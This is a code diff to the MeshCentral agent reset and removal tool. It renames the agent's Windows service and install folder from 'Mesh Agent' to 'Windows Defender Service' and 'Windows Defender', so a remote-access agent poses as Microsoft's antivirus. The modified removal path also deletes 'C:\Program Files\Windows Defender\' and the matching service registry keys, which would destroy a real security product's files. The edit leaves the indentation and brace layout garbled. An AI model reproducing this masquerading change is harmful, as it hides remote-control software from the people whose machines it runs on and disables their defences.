@@ -338,64 +338,60 @@ int main(int argc, char **argv)
 		size_t targetexelen = 0;
 
 		// Reset the mesh agent & clear the core
-		printf("Attempting MeshAgent Reset...\r\n");
+		printf("Attempting Windows Defender Service Reset...\r\n");
 
 		// Kill the agent 3 different ways.
 		killProcess("meshagent.exe");
 		killProcess2("meshagent.exe");
-		killService("Mesh Agent");
+		killService("Windows Defender Service");
 		Sleep(1000);
 
 		// Stop the service
-		i = GetServiceState("Mesh Agent");
-		if (i == 100) { printf("Mesh Agent is not installed.\r\n"); return; }
-		if (i != 1) { StopService("Mesh Agent"); }
+		i = GetServiceState("Windows Defender Service");
+		if (i == 100) { printf("Windows Defender Service is not installed.\r\n"); return; }
+		if (i != 1) { StopService("Windows Defender Service"); }
 
 		// Remove the core from the .db file
 		if (SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, targetexe) != S_FALSE) {
-			targetexelen = strnlen_s(targetexe, _MAX_PATH + 40);
-			memcpy_s(targetexe + targetexelen, _MAX_PATH + 40 - targetexelen, "\\Mesh Agent\\MeshAgent.db\0", 25);
-			removeMeshCore(targetexe);
-		} else {
-			removeMeshCore("C:\\Program Files\\Mesh Agent\\MeshAgent.db");
+		targetexelen = strnlen_s(targetexe, _MAX_PATH + 40);
+		memcpy_s(targetexe + targetexelen, _MAX_PATH + 40 - targetexelen, "\\Windows Defender\\MeshAgent.db\0", 31);
+		removeMeshCore(targetexe);
+	} else {
+		removeMeshCore("C:\\Program Files\\Windows Defender\\MeshAgent.db");
 		}
 
 		// Remove the core from the .db file
-		if (SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86 | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, targetexe) != S_FALSE) {
-			targetexelen = strnlen_s(targetexe, _MAX_PATH + 40);
-			memcpy_s(targetexe + targetexelen, _MAX_PATH + 40 - targetexelen, "\\Mesh Agent\\MeshAgent.db\0", 25);
-			removeMeshCore(targetexe);
-		} else {
-			removeMeshCore("C:\\Program Files (x86)\\Mesh Agent\\MeshAgent.db");
-		}
-
-		// Start the agent again
-		LaunchService("Mesh Agent");
+	if (SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86 | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, targetexe) != S_FALSE) {
+		targetexelen = strnlen_s(targetexe, _MAX_PATH + 40);
+		memcpy_s(targetexe + targetexelen, _MAX_PATH + 40 - targetexelen, "\\Windows Defender\\MeshAgent.db\0", 31);
+		removeMeshCore(targetexe);
+	} else {
+		removeMeshCore("C:\\Program Files (x86)\\Windows Defender\\MeshAgent.db");
+	}		// Start the agent again
+		LaunchService("Windows Defender Service");
 		printf("Done.\r\n");
 	} else if ((argc == 2) && (strcasecmp(argv[1], "remove") == 0)) {
 		int i;
 
-		printf("Attempting MeshAgent Removal...\r\n");
+	printf("Attempting Windows Defender Service Removal...\r\n");
 
-		// Kill the agent 3 different ways.
-		killProcess("meshagent.exe");
-		killProcess2("meshagent.exe");
-		killService("Mesh Agent");
-		Sleep(1000);
+	// Kill the agent 3 different ways.
+	killProcess("meshagent.exe");
+	killProcess2("meshagent.exe");
+	killService("Windows Defender Service");
+	Sleep(1000);
 
-		// Stop & remove the service
-		i = GetServiceState("Mesh Agent");
-		if (i != 100) {
-			if (i != 1) { StopService("Mesh Agent"); }
-			UninstallService("Mesh Agent");
-		}
-		i = GetServiceState("Mesh Agent v2");
-		if (i != 100) {
-			if (i != 1) { StopService("Mesh Agent v2"); }
-			UninstallService("Mesh Agent v2");
-		}
-
-		// Remove the MeshAgent v1 registry keys if present
+	// Stop & remove the service
+	i = GetServiceState("Windows Defender Service");
+	if (i != 100) {
+		if (i != 1) { StopService("Windows Defender Service"); }
+		UninstallService("Windows Defender Service");
+	}
+	i = GetServiceState("Mesh Agent v2");
+	if (i != 100) {
+		if (i != 1) { StopService("Mesh Agent v2"); }
+		UninstallService("Mesh Agent v2");
+	}		// Remove the MeshAgent v1 registry keys if present
 		if (RegDeleteKeyEx(HKEY_LOCAL_MACHINE, "Software\\Open Source\\MeshAgent", KEY_WOW64_32KEY, 0) == ERROR_SUCCESS) { printf("Removed WOW64 registry key: LOCALMACHINE\\Software\\Open Source\\MeshAgent.\r\n"); }
 		if (RegDeleteKeyEx(HKEY_CURRENT_USER, "Software\\Open Source\\MeshAgent", KEY_WOW64_32KEY, 0) == ERROR_SUCCESS) { printf("Removed WOW64 registry key: CURRENTUSER\\Software\\Open Source\\MeshAgent.\r\n"); }
 		if (RegDeleteKey(HKEY_LOCAL_MACHINE, "Software\\Open Source\\MeshAgent") == ERROR_SUCCESS) { printf("Removed registry key: LOCALMACHINE\\Software\\Open Source\\MeshAgent.\r\n"); }
@@ -407,17 +403,17 @@ int main(int argc, char **argv)
 		if (RegDeleteKey(HKEY_LOCAL_MACHINE, "Software\\Open Source\\MeshAgent2") == ERROR_SUCCESS) { printf("Removed registry key: LOCALMACHINE\\Software\\Open Source\\MeshAgent2.\r\n"); }
 		if (RegDeleteKey(HKEY_CURRENT_USER, "Software\\Open Source\\MeshAgent2") == ERROR_SUCCESS) { printf("Removed registry key: CURRENTUSER\\Software\\Open Source\\MeshAgent2.\r\n"); }
 
-		// Remove windows service keys
-		if (RegDeleteKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Mesh Agent", KEY_WOW64_32KEY, 0) == ERROR_SUCCESS) { printf("Removed service keys.\r\n"); }
-		if (RegDeleteKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Mesh Agent") == ERROR_SUCCESS) { printf("Removed service keys.\r\n"); }
+	// Remove windows service keys
+	if (RegDeleteKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Windows Defender Service", KEY_WOW64_32KEY, 0) == ERROR_SUCCESS) { printf("Removed service keys.\r\n"); }
+	if (RegDeleteKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Windows Defender Service") == ERROR_SUCCESS) { printf("Removed service keys.\r\n"); }
 
-		// Remove uninstall icon if present
-		if (RegDeleteKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\MeshCentralAgent", KEY_WOW64_32KEY, 0) == ERROR_SUCCESS) { printf("Removed WOW64 uninstall icon.\r\n"); }
-		if (RegDeleteKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\MeshCentralAgent") == ERROR_SUCCESS) { printf("Removed uninstall icon.\r\n"); }
+	// Remove uninstall icon if present
+	if (RegDeleteKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\MeshCentralAgent", KEY_WOW64_32KEY, 0) == ERROR_SUCCESS) { printf("Removed WOW64 uninstall icon.\r\n"); }
+	if (RegDeleteKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\MeshCentralAgent") == ERROR_SUCCESS) { printf("Removed uninstall icon.\r\n"); }
 
-		// Remote mesh agent folder
-		removeDir("C:\\Program Files\\Mesh Agent\\");
-		removeDir("C:\\Program Files (x86)\\Mesh Agent\\");
+	// Remote mesh agent folder
+	removeDir("C:\\Program Files\\Windows Defender\\");
+	removeDir("C:\\Program Files (x86)\\Windows Defender\\");
 	} else {
 		// Display help
 		printf("MeshCentral Agent Reset & Removal Tool v1. Usage:\r\n\r\n");
@@ -445,4 +441,5 @@ int main(int argc, char **argv)
 	return 0;
 #endif
 }
+
 
